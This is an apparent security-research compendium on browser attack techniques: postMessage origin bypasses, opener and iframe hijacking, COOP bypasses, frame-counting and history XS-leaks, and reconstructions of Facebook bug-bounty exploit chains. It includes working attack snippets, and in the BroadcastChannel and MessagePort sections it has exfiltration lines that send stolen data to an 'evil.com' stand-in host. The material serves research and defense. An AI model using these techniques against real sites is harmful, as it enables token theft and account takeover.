# Browsing Context Quirks & Attack Techniques — Deep Research

> Compiled from: ysamm.com blog, Critical Thinking podcast, PortSwigger, XS-Leaks Wiki, WHATWG spec, and hands-on browser testing.

---

## Table of Contents
1. [e.source Behavior When Iframe is Destroyed](#1-esource-behavior-when-iframe-is-destroyed)
2. [WindowProxy — The Ghost Reference](#2-windowproxy--the-ghost-reference)
3. [Iframe Hijacking via Browsing Context Relationships](#3-iframe-hijacking-via-browsing-context-relationships)
4. [Opener Hijacking & Navigation Attacks](#4-opener-hijacking--navigation-attacks)
5. [COOP Bypass Techniques](#5-coop-bypass-techniques)
6. [postMessage Origin Bypass Patterns](#6-postmessage-origin-bypass-patterns)
7. [Sandboxed Iframes & Null Origin Abuse](#7-sandboxed-iframes--null-origin-abuse)
8. [Sandbox Escape Techniques](#8-sandbox-escape-techniques)
9. [Named Window Targeting](#9-named-window-targeting)
10. [window.name Cross-Origin Data Smuggling](#10-windowname-cross-origin-data-smuggling)
11. [about:blank Origin Inheritance](#11-aboutblank-origin-inheritance)
12. [Frame Counting Side Channels](#12-frame-counting-side-channels)
13. [history.length Side Channel](#13-historylength-side-channel)
14. [Service Worker & BroadcastChannel Attacks](#14-service-worker--broadcastchannel-attacks)
15. [e.source vs e.origin — Security Comparison](#15-esource-vs-eorigin--security-comparison)
16. [MessagePort.prototype.postMessage Hijacking](#16-messageportprototypepostmessage-hijacking)
17. [Real-World Attack Chains (ysamm / Facebook)](#17-real-world-attack-chains-ysamm--facebook)
18. [Real-World Attack Chains (Critical Thinking Podcast)](#18-real-world-attack-chains-critical-thinking-podcast)
19. [Blob URL Persistence for XSS](#19-blob-url-persistence-for-xss)
20. [Math.random() PRNG Prediction via Browsing Contexts](#20-mathrandom-prng-prediction-via-browsing-contexts)

---

## 1. e.source Behavior When Iframe is Destroyed

### The Claim (Debunked)
> "When an iframe sends a postMessage and is immediately destroyed, Chrome sets `event.source` to `null`. Since `null == undefined` is `true`, checks like `e.source == window.frames[0]` are bypassed."

### What Actually Happens (Tested Feb 2026, Chromium via Playwright)

**Chrome does NOT set `e.source` to `null`.** When a source iframe is removed after sending a postMessage:

| Property | Value | Meaning |
|---|---|---|
| `e.source` | `[object Window]` | Still a Window reference |
| `e.source === null` | `false` | Not null |
| `e.source == null` | `false` | Not loosely null either |
| `e.source.closed` | `true` | The window IS dead/closed |
| `typeof e.source` | `object` | Still an object, not null |
| `window.frames[0]` | `undefined` | iframe was removed |
| `e.source == window.frames[0]` | **`false`** | Bypass fails |

**Why:** The HTML spec says `MessageEvent.source` is a `WindowProxy`. Removing an iframe discards its browsing context but the `WindowProxy` reference survives as a dead/closed object. A dead Window is still an `object`, not `null` or `undefined`.

### When e.source IS Actually Null
- `BroadcastChannel` messages — `e.source` is always `null`
- `MessagePort`-based communication — `e.source` is `null` (message comes through port, not window)
- Possibly in older browser versions (pre-2020 Chrome) — unconfirmed

### The Real Danger with e.source
The real vulnerability is not `null == undefined` but that **`e.source` is a live WindowProxy**. If the source iframe navigates between sending and the handler processing, `e.source` now points to the new document. See [Section 15](#15-esource-vs-eorigin--security-comparison).

**Source:** Hands-on testing, WHATWG HTML spec §7.2 (Browsing contexts)

---

## 2. WindowProxy — The Ghost Reference

### Spec Behavior (WHATWG HTML)
When an iframe is removed from the DOM:
1. The `Window` object continues to exist in memory
2. The `WindowProxy` continues to reference that `Window`
3. The browsing context is **discarded** — its document is unloaded
4. `windowProxy.closed` returns `true`
5. Most properties throw `SecurityError` or return `undefined`
6. The session history is destroyed

### Security Implications

**Stale reference pattern:**
```javascript
// Parent caches iframe reference
var cachedRef = iframe.contentWindow;

// Later, iframe is removed and recreated
iframe.remove();
var newIframe = document.createElement('iframe');
newIframe.src = 'https://attacker.com';
document.body.appendChild(newIframe);

// cachedRef is now stale — points to dead WindowProxy
// newIframe.contentWindow is a different WindowProxy
// If parent sends data to cachedRef, it goes nowhere (or throws)
```

**Response-to-navigated-source pattern (the REAL attack):**
```javascript
window.addEventListener('message', function(e) {
  if (e.origin === 'https://trusted.com') {
    // DANGEROUS if using '*' as targetOrigin
    e.source.postMessage(secretData, '*');
    // If source iframe navigated to attacker.com between send and handler,
    // secretData goes to attacker.com
  }
});
```

**Source:** WHATWG HTML spec §7.2, XS-Leaks Wiki

---

## 3. Iframe Hijacking via Browsing Context Relationships

### Core Technique
Any page with a reference to a window can navigate its descendant frames. An attacker who opens `victim.com` via `window.open` can navigate its child iframes:

```javascript
var victim = window.open('https://victim.com');
// Navigate victim's first child iframe
victim.frames[0].location = 'https://attacker.com/fake-widget.html';
```

### Why It Works
The "allowed to navigate" algorithm in the HTML spec permits navigation of frames that are descendants of a page you opened. The browsing context reference (`frames[0]`) works cross-origin.

### Two Exploitation Directions

**Direction 1 — Intercept data FROM parent:**
If parent does `iframe.contentWindow.postMessage(sensitiveData, '*')`, the hijacked iframe (now attacker-controlled) receives it.

**Direction 2 — Send data TO parent:**
The hijacked iframe sends crafted messages: `window.parent.postMessage({action: 'updateEmail', email: 'attacker@evil.com'}, '*')`. Since `e.source` matches `iframe.contentWindow` (it IS that iframe's window), source-based validation passes.

### Why e.source Checks Don't Help
After hijack, `myIframe.contentWindow` points to the new document (attacker's page). `e.source` from the attacker's message matches `myIframe.contentWindow` because it IS that iframe's window now. **Only `e.origin` check is reliable.**

### Real-World Example (Critical Thinking Ep.119)
Youssef Sammouda's Facebook Canvas research ($126k) demonstrated iframe hijacking through the `xdArbiter` communication bridge. Sub-iframes could be navigated cross-origin: `window.frames[1].frames[0].location.href = "data:text/html;base64,..."`.

**Source:** WHATWG spec "allowed to navigate", Critical Thinking Ep.119, ysamm.com

---

## 4. Opener Hijacking & Navigation Attacks

### Basic Opener Hijack Flow
1. Attacker: `x = window.open("https://victim.com")`
2. User on victim.com clicks "Authorize" → opens auth popup
3. While user authenticates, attacker navigates: `x.location = "https://evil.com/catch.html"`
4. Auth popup finishes: `window.opener.postMessage(token, '*')` → attacker receives token

### Dirty Dancing (OAuth Flow Hijacking)
Documented by Frans Rosén / Detectify Labs:
1. Attacker opens victim's OAuth login page via `window.open()`
2. OAuth redirects back with token in URL fragment or via postMessage
3. If using `window.opener.postMessage()`, the attacker (as opener) receives the token

### Advanced: Reverse Tabnabbing
```javascript
// Attacker page opened from victim via <a target="_blank">
if (window.opener) {
  window.opener.location = 'https://evil.com/fake-login';
}
```

### Detection: Timing the Popup
```javascript
const victim = window.open('https://victim.com');
let baseFrameCount = null;
setInterval(() => {
  try {
    const frames = victim.length;
    if (baseFrameCount === null) { baseFrameCount = frames; return; }
    if (frames !== baseFrameCount) {
      // Popup opened — frame count changed
      setTimeout(() => { victim.location = 'https://evil.com/catch.html'; }, 500);
    }
  } catch(e) {}
}, 50);
```

**Source:** Detectify Labs, Critical Thinking Ep.107, Browsing-context.md

---

## 5. COOP Bypass Techniques

### COOP Values
| Value | Effect |
|---|---|
| `unsafe-none` | Default, no protection |
| `same-origin` | Strict — severs all cross-origin window references |
| `same-origin-allow-popups` | Page can open popups that keep opener |
| `noopener-allow-popups` | Prevents popup from referencing opener |

### Bypass 1: COOP Doesn't Apply to Non-Top-Level Pages (Critical Thinking Ep.107)
**This is the most actionable bypass.** COOP headers only protect top-level browsing contexts. If you can get the target page loaded in an iframe, COOP is ignored.

**Attack flow:**
1. Target `www.victim.com` has COOP and a postMessage vulnerability
2. Find a page on `victim.com` without COOP that iframes a 3rd-party service
3. XSS the 3rd-party service
4. From attacker page, `window.open` the non-COOP victim page
5. Via the XSS'd 3rd-party iframe, redirect it to `www.victim.com/vulnerable-page`
6. The target page loads as a non-top-level context → COOP ignored → exploit postMessage

### Bypass 2: COOP as XS-Leak Oracle
If a page conditionally sets COOP (e.g., logged-in vs. logged-out), detect state:
```javascript
const win = window.open('https://victim.com');
setTimeout(() => {
  if (!win.opener) console.log("COOP active → user is logged in");
  else console.log("No COOP → user is logged out");
}, 2000);
```

### Bypass 3: same-origin-allow-popups Misconfiguration
If a COOP page opens a cross-origin popup the attacker controls (via open redirect), the attacker's page gets `window.opener` back to the victim.

### Bypass 4: Inconsistent Deployment
If only some pages set COOP, target the unprotected pages.

### Bypass 5: window.name Self-Opener (ysamm — Facebook Android WebView)
```javascript
window.name = "test";
window.open(target, "test");
```
Makes the window its own opener, bypassing COOP `same-origin-allow-popups` in certain WebView implementations.

### Bypass 6: JavaScript opener=null is Weaker Than COOP
`window.opener = null` via JS can be defeated:
- Attacker sandboxes an iframe to disable JS, preventing `opener = null` from executing
- The opener is available in the brief window between page load and script execution

**Source:** Critical Thinking Ep.107, XS-Leaks Wiki, ysamm.com/capig-xss

---

## 6. postMessage Origin Bypass Patterns

### Pattern 1: indexOf / includes
```javascript
if (e.origin.indexOf('trusted.com') > -1) { ... }
```
**Bypass:** `http://trusted.com.evil.net` — substring match.

### Pattern 2: endsWith
```javascript
if (e.origin.endsWith('trusted.com')) { ... }
```
**Bypass:** `http://malicioustrusted.com` — no dot separator check.

### Pattern 3: startsWith
```javascript
if (e.origin.startsWith('https://trusted')) { ... }
```
**Bypass:** `https://trusted.evil.com`

### Pattern 4: Unanchored Regex
```javascript
if (/trusted\.com/.test(e.origin)) { ... }
```
**Bypass:** `http://trusted.com.evil.net` — no `^` or `$` anchors.

### Pattern 5: Missing Dot Escape in Regex (ysamm — Facebook JS SDK)
```javascript
// Vulnerable
var j = /^https:\/\/.*facebook.com$/;
// "facebook" not escaped — matches "testpocfacebook.com"
```
**Bypass:** Register `testpocfacebook.com`. Bounty: part of $850k+ series.

### Pattern 6: Backwards isSameOrigin (ysamm — Facebook CometCompatBroker)
```javascript
// WRONG — untrusted checks against trusted
b.isSameOrigin(a)  // b = attacker, a = trusted

// When b has null/undefined protocol, domain, port:
// Short-circuits all checks → returns true
```
**Bypass:** Send from sandboxed iframe (origin = `"null"` → parsed fields are undefined).

**Correct pattern:** `trustedOrigin.isSameOrigin(untrustedOrigin)`

### Pattern 7: Trusting Third-Party Origins (ysamm — $62,500)
Even with strict origin checks, if the trusted origin (e.g., ThirdPartyPaymentProvider.com) has an XSS, the attacker can send messages from that trusted origin. Origin validation is only as strong as the weakest trusted origin.

**Source:** PortSwigger Academy, ysamm.com, Critical Thinking Ep.8

---

## 7. Sandboxed Iframes & Null Origin Abuse

### Core Behavior
A sandboxed iframe with `allow-scripts` but without `allow-same-origin` has an opaque origin. Its `event.origin` in postMessage is the string `"null"`.

### Attack: Bypassing Origin Checks That Don't Explicitly Reject "null"
```html
<iframe sandbox="allow-scripts" srcdoc="
  <script>parent.postMessage('malicious', '*')</script>
"></iframe>
```
If victim checks `e.origin !== ""` or trusts any non-empty origin, this bypasses it.

### Attack: URI Parser Confusion (ysamm — Facebook CometCompatBroker)
When origin `"null"` is parsed as a URI, fields like protocol, domain, port become `null/undefined`. This broke Facebook's `isSameOrigin` check because `if (this.getProtocol() && ...)` short-circuited on falsy values.

### Credentialless Iframes (Critical Thinking Ep.118/128)
`<iframe credentialless>` creates a clean browsing context — no cookies, no storage, no session data. Similar to null-origin sandbox with `allow-popups`.

**Source:** ysamm.com, Critical Thinking Ep.118/128, PortSwigger

---

## 8. Sandbox Escape Techniques

### The Dangerous Combination
```html
sandbox="allow-scripts allow-same-origin"
```
The iframe can modify its own sandbox attribute via the parent DOM and remove all restrictions.

### allow-popups-to-escape-sandbox
```html
<iframe sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"
        src="https://attacker.com/payload.html">
```
Popups opened from this iframe are **not sandboxed**. They have full access to cookies, localStorage, etc. of whatever URL they navigate to. Effectively nullifies the sandbox.

**Pattern to grep for:**
```
allow-popups-to-escape-sandbox
```

### Safe vs Dangerous
```html
<!-- DANGEROUS: full escape via popups -->
sandbox="allow-scripts allow-popups allow-popups-to-escape-sandbox"

<!-- SAFE: popups remain sandboxed -->
sandbox="allow-scripts allow-popups"
```

**Source:** WHATWG spec, PortSwigger, Critical Thinking Ep.73

---

## 9. Named Window Targeting

### Browsing Context Name Persistence
The `name` of a browsing context is NOT scoped by origin. `window.open(url, name)` searches all accessible browsing contexts for a matching name before creating a new one.

### Attack: Window Name Squatting
```javascript
// Attacker pre-creates a named window
var target = window.open('about:blank', 'oauth_popup');

// When victim later does:
// window.open('https://idp.com/auth', 'oauth_popup')
// It REUSES the attacker's window
// OAuth response lands in attacker's controlled context
```

### Attack: Iframe Name Hijack
```html
<iframe name="importantFrame"></iframe>
```
Any page in the frame tree can do: `window.open('https://evil.com', 'importantFrame')` — replaces the frame's content.

**Source:** WHATWG spec, XS-Leaks Wiki

---

## 10. window.name Cross-Origin Data Smuggling

### Core Behavior
`window.name` persists across navigations within the same browsing context, **including cross-origin navigations**.

### Data Exfiltration
```javascript
// Victim page sets window.name
window.name = "sensitive_token_12345";

// Page navigates to attacker's site (redirect, link, etc.)
// Attacker reads:
var stolen = window.name; // "sensitive_token_12345"
```

### Data Smuggling (Payload Delivery)
```javascript
window.open('https://target.com/vuln', 'xss_payload_here');
// Target reads window.name → gets payload
```

### PRNG State Extraction (ysamm — $66,000)
Facebook's JS SDK generates iframe names using `Math.random()`. By navigating sub-iframes to an attacker-controlled page and reading their `window.name`, PRNG outputs are extracted. With 4+ outputs, V8's xorshift128+ state can be reconstructed using a Z3 solver.

**Source:** ysamm.com/math-random-facebook-sdk, Browsing-context.md

---

## 11. about:blank Origin Inheritance

### Rules
| URL Scheme | Origin Behavior |
|---|---|
| `about:blank` | Inherits creator's origin |
| `data:` URI | Opaque origin (`"null"`) |
| `blob:` URI | Inherits creator's origin |
| `javascript:` URI | Inherits navigating context's origin |

### Security Implication
Messages from `about:blank` iframes have `e.origin` equal to the **creator's origin**, not `"about:blank"`. If an attacker can run code in an `about:blank` context created by a trusted origin, they effectively have that trusted origin for postMessage purposes.

### CSP Bypass
`about:blank` iframes may not be covered by the parent's CSP if not explicitly addressed.

**Source:** WHATWG spec, PortSwigger

---

## 12. Frame Counting Side Channels

### The Leak
`window.length` / `window.frames.length` is accessible cross-origin and reveals the number of child frames.

### XS-Search via Frame Count
```javascript
var win = window.open('https://victim.com/search?q=secret');
var pattern = [];
var recorder = setInterval(() => {
  pattern.push(win.length);
}, 60);
setTimeout(() => {
  clearInterval(recorder);
  console.log("Pattern:", pattern.join(', '));
  // Different frame counts reveal different page states
}, 6000);
```

### Real-World Examples
- **Facebook:** Leaked user-related info (posts, religious info, photo locations) via frame count differences — reported by Imperva
- **GitHub:** Private repository exposure via cross-site frame counting

### Defense
| Context | SameSite Lax | COOP | X-Frame-Options | Isolation Policies |
|---|:---:|:---:|:---:|:---:|
| iframes | Protects | No | Protects | FIP |
| windows | No | Protects | No | NIP |

**Source:** XS-Leaks Wiki, Imperva blog, Critical Thinking podcast

---

## 13. history.length Side Channel

### The Leak
`history.length` is cross-origin readable and reveals navigation count.

### XS-Search Pattern
```javascript
var win = window.open('about:blank');
var initial = win.history.length;
win.location = 'https://victim.com/search?q=a';
setTimeout(() => {
  win.location = 'https://attacker.com/check.html';
  // check.html reads history.length
  // If increased by >1, redirects occurred → results exist
}, 2000);
```

### CSP Violation Side Channel (Alternative)
```html
<meta http-equiv="Content-Security-Policy" content="form-action https://example.org">
<script>
document.addEventListener('securitypolicyviolation', () => {
  console.log("Redirect to cross-origin detected");
});
</script>
```

### Real-World Example
Twitter XS-Search: private tweet contents leaked by detecting redirect behavior (HackerOne #491473).

**Source:** XS-Leaks Wiki, HackerOne

---

## 14. Service Worker & BroadcastChannel Attacks

### Service Worker postMessage
- `clients.matchAll()` broadcasts to ALL clients in scope, including attacker-controlled iframes on the same origin
- Malicious SW registration (via XSS or path confusion) persists across page loads

### BroadcastChannel
- **e.source is always null** — you cannot identify the sender
- All same-origin contexts receive messages — if attacker has XSS on any page of the origin, they see everything
- No authentication mechanism for channel messages

```javascript
// Attacker (same-origin via XSS) listens on app channels
const bc = new BroadcastChannel('auth');
bc.onmessage = (e) => {
  // e.source is null — can't filter by source
  fetch('https://evil.com/steal?data=' + JSON.stringify(e.data));
};
```

**Source:** MDN, XS-Leaks Wiki

---

## 15. e.source vs e.origin — Security Comparison

### Key Differences

| | `e.origin` | `e.source` |
|---|---|---|
| **Type** | String (immutable) | WindowProxy (live reference) |
| **When captured** | At message send time | Points to current state of sender's browsing context |
| **Navigated sender** | Still reflects original origin | Now points to new document |
| **Null scenarios** | `"null"` string for opaque origins | `null` for BroadcastChannel/MessagePort |
| **Reliability** | Reliable for authentication | Unreliable — live reference can be hijacked |

### The Race Condition Attack
```javascript
// Attacker page
var iframe = document.createElement('iframe');
iframe.src = 'https://trusted.com/send-message-page';
document.body.appendChild(iframe);

iframe.onload = function() {
  // Trusted page sends postMessage to parent
  // Small delay, then navigate iframe to attacker
  setTimeout(() => {
    iframe.src = 'https://attacker.com/receiver.html';
  }, 10);
};

// Victim handler responds to e.source with '*'
window.addEventListener('message', function(e) {
  if (e.origin === 'https://trusted.com') {
    e.source.postMessage(secretData, '*');  // GOES TO ATTACKER!
  }
});
```

### Safe Patterns
```javascript
// SAFE: Use e.origin as targetOrigin (fails if navigated cross-origin)
e.source.postMessage(data, e.origin);

// DANGEROUS: Wildcard targetOrigin with live WindowProxy
e.source.postMessage(data, '*');
```

**Source:** WHATWG spec, XS-Leaks Wiki, PortSwigger

---

## 16. MessagePort.prototype.postMessage Hijacking

### Technique (Critical Thinking Ep.100 — MatanBer)
When a page establishes a `MessageChannel` and sends one port to a child frame, an attacker who gains code execution in that frame can hijack the communication:

```javascript
// Attacker overrides the prototype
MessagePort.prototype.postMessage = function(msg) {
  // Intercept all messages sent through ANY MessagePort
  fetch('https://evil.com/steal', {
    method: 'POST',
    body: JSON.stringify(msg)
  });
  // Optionally forward to original
  MessagePort.prototype.__original_postMessage.call(this, msg);
};
```

### Real-World Application
MatanBer's attack chain:
1. Escape sandboxed frame into bridge frame (same origin)
2. Override `MessagePort.prototype.postMessage` in bridge frame
3. All communication between bridge and main frame now intercepted
4. Attacker modifies messages to bypass path validation (`\` instead of `/` for traversal)
5. Steals CSRF token → Account Takeover

**Source:** Critical Thinking Ep.100

---

## 17. Real-World Attack Chains (ysamm / Facebook)

### Chain 1: Canvas XdArbiter Parameter Pollution ($126,000)
**Flow:** Attacker iframe → sends postMessage with `redirect_uri[0` parameter pollution → server interprets as redirect_uri override → OAuth token redirected to attacker
```javascript
msg = JSON.stringify({"jsonrpc":"2.0", "method":"showDialog", "id":1,
  "params":[{"method":"permissions.oauth",
    "redirect_uri":"https://attacker.com/callback",
    "redirect_uri[0":"https://www.instagram.com/accounts/signup/"}]})
```

### Chain 2: Race Condition on Origin Variable ($42,000)
**Flow:** Register origin as `fbconnect://success` → trigger OAuth → while waiting, re-register origin as `https://attacker.com` → token delivered to attacker
```javascript
// Step 1: Register legitimate origin
postMessage({xdArbiterRegister:true, origin:"fbconnect://success"}, "*");
// Step 2: Trigger OAuth
postMessage({xdArbiterHandleMessage:true, message:"FB_RPC:" + msg}, "*");
// Step 3: Race — change origin before token arrives
setTimeout(() => {
  postMessage({xdArbiterRegister:true, origin:"https://attacker.com"}, "*");
}, 1000);
```

### Chain 3: capig-events.js Supply Chain XSS ($250,000)
**Flow:** Backend Java code constructs JS via string concatenation without escaping → attacker injects `"]}` to break out of string context → stored XSS in `capig-events.js` → affects 100M+ websites loading the script

### Chain 4: Third-Party Payment Provider Trust Boundary ($62,500)
**Flow:** XSS ThirdPartyPaymentProvider.com → turn it into message relay → send `ThirdPartyPaymentProvider.learnMore` message to facebook.com parent → HTML injected into facebook.com DOM without sanitization → escalate to ATO via device-based login

### Chain 5: goURIOnWindow Type Confusion ($62,500)
**Flow:** Pass array instead of string to URI handler → `typeof array === "object"` → code assumes it's a safe URI object → calls `toString()` on array → `javascript:` URI executes
```javascript
// Vulnerable: non-string assumed to be URI object
var e = typeof b === "string" ? getUri(b) : b;
if (e) a.location = e.toString();  // Array.toString() joins elements!
```

### Chain 6: fbevents.js opener-based Token Theft ($32,500)
**Flow:** Open Instagram OAuth → lands on developers.facebook.com error page (loads fbevents.js) → fbevents.js has message listener activated by `window.opener` → navigate opener to facebook.com endpoint that sends crafted postMessage → fbevents.js sends Graph API request including `location.href` with attacker's token → attacker reads OAuth code from API response

**Source:** ysamm.com (full collection linked in Sources section)

---

## 18. Real-World Attack Chains (Critical Thinking Podcast)

### Chain 1: COOP Bypass via 3rd-Party Iframe (Ep.107)
1. Find victim page with COOP + postMessage vuln
2. Find another victim page WITHOUT COOP that embeds a 3rd-party iframe
3. XSS the 3rd-party service
4. `window.open` the non-COOP victim page
5. Use XSS'd iframe to navigate it to the COOP-protected page
6. Page loads as non-top-level → COOP ignored → exploit postMessage

### Chain 2: MatanBer Frame Stack Attack (Ep.100)
1. Inject malicious Markdown → rendered in sandboxed frame
2. Escape sandbox → bridge frame (same origin, use `parent.frames` traversal)
3. Override `MessagePort.prototype.postMessage`
4. Path traversal with `\` (not checked, only `../` was filtered)
5. Steal CSRF token → Account Takeover

### Chain 3: X-Content-Type-Options Double Header Bypass (Ep.107)
Adding a second `X-Content-Type-Options` with an invalid value causes the browser to discard BOTH headers, reverting to MIME sniffing.

**Source:** Critical Thinking podcast blog + episodes

---

## 19. Blob URL Persistence for XSS

### Technique (ysamm — Facebook)
After achieving XSS on a target, create a Blob URL to prevent the page from navigating away:
```javascript
const code = `<html><script>
  // Full exploitation code here
  // This page persists — Facebook can't navigate away
</script></html>`;

const blob = new Blob([code], { type: "text/html" });
window.location.href = URL.createObjectURL(blob);
```

### Why It Works
- Blob URLs inherit the creator's origin (`blob:https://facebook.com/uuid`)
- The page cannot be refreshed or navigated by the server
- Attacker's code has full access to the facebook.com origin
- Survives any server-side session invalidation attempts

**Source:** ysamm.com/self-xss-facebook-payments

---

## 20. Math.random() PRNG Prediction via Browsing Contexts

### Technique (ysamm — $66,000)
Facebook's JS SDK used `Math.random()` to generate security-critical callback identifiers and iframe names:
```javascript
function guid() {
  return "f" + (Math.random() * (1 << 30)).toString(16).replace(".", "");
}
```

### PRNG State Recovery
1. Embed victim page (with Facebook SDK) in iframe
2. Force plugin reinitialization via `init:post` postMessage with `{xfbml: true}`
3. Navigate sub-iframes to attacker origin: `window.frames[0].frames[0] = "https://attacker.com"`
4. Read iframe names via `window.name` (persists cross-origin)
5. Collect 4+ PRNG outputs
6. Use Z3 solver to reconstruct V8 xorshift128+ PRNG state
7. Predict future callback identifiers
8. Forge valid callback IDs for postMessage exploitation

**Source:** ysamm.com/math-random-facebook-sdk

---

## Quick Reference: Browsing Context Cross-Origin Accessible Properties

| Property/Method | Readable | Writable | Notes |
|---|:---:|:---:|---|
| `window.closed` | Yes | — | Detect if window is closed |
| `window.frames` / `window.length` | Yes | — | Frame counting side channel |
| `window.location` | — | Yes (navigate) | Cannot read, only set |
| `window.opener` | Yes | Yes | Can null it out or read it |
| `window.parent` | Yes | — | Always accessible |
| `window.top` | Yes | — | Always accessible |
| `window.postMessage()` | — | — | Can always call |
| `window.close()` | — | — | Can always call |
| `window.focus()` | — | — | Can always call |
| `window.blur()` | — | — | Can always call |
| `history.length` | Yes | — | Navigation count side channel |
| `window.name` | — | — | Cross-origin writable via `window.open(url, name)` |

---

## Sources

### ysamm.com (Youssef Sammouda)
- [postMessage DOM XSS via payments/redirect.php](https://ysamm.com/uncategorized/2020/11/07/facebook-dom-based-xss-using-postmessage.html)
- [Bad Regex in Facebook JS SDK](https://ysamm.com/uncategorized/2020/12/31/bad-regex-in-facebook-javascript-sdk-leads-to-account-takeovers-in-third-party-websites-that-included-it.html)
- [Canvas XdArbiter ATO — $126k](https://ysamm.com/uncategorized/2021/09/03/more-secure-facebook-canvas-applications-tale-of-126k-worth-of-bugs-that-lead-to-facebook-account-takeovers.html)
- [Canvas Part 2 — Race Conditions](https://ysamm.com/uncategorized/2022/03/04/more-secure-facebook-canvas-part-2.html)
- [CometCompatBroker Origin Bypass](https://ysamm.com/uncategorized/2023/01/29/account-takeover-in-canvas-apps-served-in-comet-due-to-failure-in-cross-window-message-origin-validation.html)
- [Instant Games goURIOnWindow Type Confusion](https://ysamm.com/uncategorized/2023/01/29/dom-xss-in-instant-games-due-to-improper-verification-of-supplied-urls.html)
- [capig-events.js Supply Chain XSS — $250k](https://ysamm.com/uncategorized/2026/01/13/capig-xss.html)
- [Self-XSS Payments → ATO — $62.5k](https://ysamm.com/uncategorized/2026/01/15/self-xss-facebook-payments.html)
- [Instagram Billing postMessage Leak](https://ysamm.com/uncategorized/2026/01/15/steal-fxauth-leads-instagram-ato.html)
- [fbevents.js opener-based Token Theft](https://ysamm.com/uncategorized/2026/01/16/leaking-fbevents-ato.html)
- [FXAuth Token Leakage](https://ysamm.com/uncategorized/2026/01/16/leaking-fxauth-token.html)
- [Math.random() PRNG Prediction — $66k](https://ysamm.com/uncategorized/2026/01/17/math-random-facebook-sdk.html)

### Critical Thinking Podcast
- [Ep.8 — PostMessage Bugs](https://www.criticalthinkingpodcast.io/episode-8-postmessage-bugs-css-injection-and-bug-drops/)
- [Ep.58 — Youssef Sammouda Client-Side War Stories](https://www.criticalthinkingpodcast.io/episode-58-youssef-sammouda-client-side-ato-war-stories/)
- [Ep.73 — Sandboxed IFrames](https://www.youtube.com/watch?v=uHOxsmdsXUA)
- [Ep.100 — Frame Hijacking (MatanBer)](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-100-8-fav-bugs-of-2024-farewell-joel-hello-shift-cursor-of-hacking)
- [Ep.107 — COOP Bypass](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-107-bypassing-cross-origin-browser-headers)
- [Ep.119 — Abusing Iframes](https://www.criticalthinkingpodcast.io/episode-119-abusing-iframes-from-a-client-side-hacker/)
- [Ep.128 — Credentialless Iframes](https://blog.criticalthinkingpodcast.io/p/hackernotes-ep-128-new-research-in-blind-ssrf-and-self-xss-and-how-to-architect-source-code-review)
- [Ep.140 — Client-Side Tricks](https://www.criticalthinkingpodcast.io/episode-140-crit-research-lab-update-client-side-tricks-galore/)
- [Ep.151 — Client-Side Advanced Topics](https://www.criticalthinkingpodcast.io/episode-151-client-side-advanced-topics/)

### Reference Material
- [PortSwigger — Controlling postMessage Source](https://portswigger.net/web-security/dom-based/controlling-the-web-message-source)
- [XS-Leaks Wiki — Window References](https://xsleaks.dev/docs/attacks/window-references/)
- [XS-Leaks Wiki — Frame Counting](https://xsleaks.dev/docs/attacks/frame-counting/)
- [XS-Leaks Wiki — Navigations](https://xsleaks.dev/docs/attacks/navigations/)
- [XS-Leaks Wiki — COOP](https://xsleaks.dev/docs/defenses/opt-in/coop/)
- [Detectify — Dirty Dancing OAuth Flows](https://labs.detectify.com/writeups/account-hijacking-using-dirty-dancing-in-sign-in-oauth-flows/)
- [WHATWG HTML Spec — Browsing Contexts](https://html.spec.whatwg.org/multipage/browsers.html)
- [WHATWG HTML Spec — postMessage](https://html.spec.whatwg.org/multipage/web-messaging.html)
- [HackerOne #491473 — Twitter XS-Search](https://hackerone.com/reports/491473)
